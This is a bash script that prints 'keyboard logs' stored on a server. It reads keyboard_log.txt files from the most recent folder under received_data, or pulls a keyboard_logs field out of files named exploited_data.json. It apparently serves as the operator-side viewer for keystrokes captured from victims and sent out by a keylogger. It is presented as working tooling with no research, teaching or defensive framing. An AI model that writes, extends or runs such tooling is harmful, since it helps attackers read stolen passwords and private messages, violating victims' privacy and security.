#!/bin/bash
# Script to view keyboard logs from received data on server
# Usage: ./view_keyboard_logs.sh [filename]

DATA_DIR="received_data"

echo "============================================================"
echo "⌨️  KEYBOARD LOGS VIEWER"
echo "============================================================"
echo ""

if [ ! -d "$DATA_DIR" ]; then
    echo "❌ Directory $DATA_DIR not found"
    exit 1
fi

if [ -n "$1" ]; then
    # View specific folder or file
    if [ -d "$1" ]; then
        # It's a folder
        FOLDER="$1"
        KB_FILE="$FOLDER/keyboard_log.txt"
        if [ ! -f "$KB_FILE" ]; then
            echo "❌ keyboard_log.txt not found in $FOLDER"
            exit 1
        fi
    elif [ -f "$1" ]; then
        # It's a file (old format or exploited_data.json)
        FILE="$1"
        if [[ "$FILE" == *"keyboard_log.txt" ]]; then
            KB_FILE="$FILE"
        elif [[ "$FILE" == *"exploited_data.json" ]] || [[ "$FILE" == *"_plain.json" ]]; then
            # Extract from JSON
            if command -v jq &> /dev/null; then
                KB_CONTENT=$(jq -r '.keyboard_logs' "$FILE" 2>/dev/null)
                if [ -n "$KB_CONTENT" ] && [ "$KB_CONTENT" != "null" ]; then
                    echo "============================================================"
                    echo "📝 KEYBOARD LOGS FROM: $(basename "$FILE")"
                    echo "============================================================"
                    echo "$KB_CONTENT"
                    exit 0
                fi
            fi
            echo "❌ Cannot extract keyboard logs from $FILE"
            exit 1
        else
            echo "❌ Unknown file type: $FILE"
            exit 1
        fi
    else
        echo "❌ Not found: $1"
        exit 1
    fi
else
    # Find latest folder
    LATEST_FOLDER=$(ls -td "$DATA_DIR"/*/ 2>/dev/null | head -1)
    if [ -z "$LATEST_FOLDER" ]; then
        echo "❌ No folders found in $DATA_DIR"
        exit 1
    fi
    FOLDER="$LATEST_FOLDER"
    KB_FILE="$FOLDER/keyboard_log.txt"
    echo "📁 Using latest folder: $(basename "$FOLDER")"
    echo ""
fi

# Display keyboard logs
if [ -f "$KB_FILE" ]; then
    echo "============================================================"
    echo "⌨️  KEYBOARD LOGS: $(basename "$(dirname "$KB_FILE")")"
    echo "============================================================"
    echo ""
    
    KB_SIZE=$(wc -c < "$KB_FILE" 2>/dev/null || echo 0)
    KB_LINES=$(wc -l < "$KB_FILE" 2>/dev/null || echo 0)
    
    echo "✅ Keyboard logs found!"
    echo "   Size: $KB_SIZE characters"
    echo "   Lines: $KB_LINES"
    echo "   File: $KB_FILE"
    echo ""
    echo "============================================================"
    echo "📝 KEYBOARD LOGS CONTENT:"
    echo "============================================================"
    cat "$KB_FILE"
    echo ""
    echo "============================================================"
    echo "💡 File location: $KB_FILE"
    echo "============================================================"
else
    echo "❌ keyboard_log.txt not found: $KB_FILE"
    exit 1
fi

